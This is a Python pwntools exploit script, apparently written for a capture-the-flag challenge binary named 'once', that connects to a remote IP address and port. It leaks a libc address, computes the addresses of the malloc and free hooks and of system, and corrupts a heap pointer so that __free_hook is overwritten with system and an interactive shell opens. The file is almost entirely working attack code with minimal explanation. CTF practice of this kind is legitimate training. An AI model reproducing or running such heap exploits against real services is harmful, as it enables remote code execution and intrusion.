#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

# imports

from pwn import *
import time
import os
import sys
import time

elf = "./once"
libc = "./libc-2.23.so"
env = ""
LOCAL = 0
context.log_level = "debug"

if LOCAL:

    #do LOCAL
    p = process("./once")
else:
    #do remote
    p = remote("47.75.189.102", 9999)

def create_one():

    print p.recvuntil("> ")
    p.sendline("1")

def readin_two(data,ok=1):

    if ok == 1:
        print p.recvuntil("> ")
    p.sendline("2")
    time.sleep(0.2)
    p.send(data)

def write_three():

    print p.recvuntil("> ")
    p.sendline("3")

def all(choice, size, data):

    print p.recvuntil("> ")
    p.sendline("4")
    print p.recvuntil("> ")
    if choice == 1:
        p.sendline("1")
        print p.recvuntil("size:\n")
        p.sendline(str(size))
        print p.recvuntil("> ")
        p.sendline("1")
    elif choice == 2:
        p.sendline("2")
        raw_input("go on ?")
        p.send(data)
        p.sendline("2")
    elif choice == 3:
        p.sendline("3")
        p.sendline("3")


#acquire libc.
print p.recvuntil("> ")
p.sendline("6")
print p.recvuntil("choice\n")
data = p.recv(14)
libc = int(data,16) - 0x6f690
print hex(libc)
malloc_hook = libc + 0x3c4b10
free_hook = libc + 0x3c67a8
system = libc + 0x45390
one = libc + 0x45216
sh = libc + 0x18cd17
#try writing ptr.

payload = "/bin/sh\x00" * 3 + p64(free_hook) + p64(malloc_hook+0x80) * 5 + p64(sh)+ "\x00" * 40

all(1, 200, "test")
create_one()
readin_two("b"*24 + "\x58")
write_three()
all(2, 200, payload)
raw_input("check.")
#go
readin_two(p64(system),0)
p.interactive()
all(1,200,"gogogo")
p.interactive()

